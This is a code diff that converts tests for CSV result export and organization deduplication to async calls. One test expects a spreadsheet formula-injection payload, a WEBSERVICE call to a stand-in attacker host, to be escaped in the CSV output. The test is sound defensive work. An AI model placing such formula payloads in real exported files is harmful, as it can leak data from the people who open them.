@@ -3,9 +3,9 @@ import { Store } from "../server/store";
 import { acceptedOrganizations, resultCsv } from "../server/results";
 import { createTask } from "./helpers";
 describe("human-reviewed result delivery", () => {
-  it("deduplicates organization names and carries separate criterion evidence links", () => {
+  it("deduplicates organization names and carries separate criterion evidence links", async () => {
     const store = new Store(":memory:");
-    const t = createTask(store);
+    const t = await createTask(store);
     t.sources = [
       {
         id: "s1",
@@ -45,11 +45,11 @@ describe("human-reviewed result delivery", () => {
     expect(result).toHaveLength(1);
     expect(result[0].sources).toHaveLength(2);
     expect(result[0].criteria.Funded).toContain("https://example.com/funding");
-    store.close();
+    await store.close();
   });
-  it("escapes CSV formulas, commas, quotes and newlines", () => {
+  it("escapes CSV formulas, commas, quotes and newlines", async () => {
     const store = new Store(":memory:");
-    const t = createTask(store);
+    const t = await createTask(store);
     t.sources = [
       {
         id: "s1",
@@ -73,6 +73,6 @@ describe("human-reviewed result delivery", () => {
     expect(csv).toContain('"\'=WEBSERVICE(""https://evil.example"")"');
     expect(csv).toContain('Note, with ""quotes""\nand newline');
     expect(csv).toContain("https://example.com");
-    store.close();
+    await store.close();
   });
 });
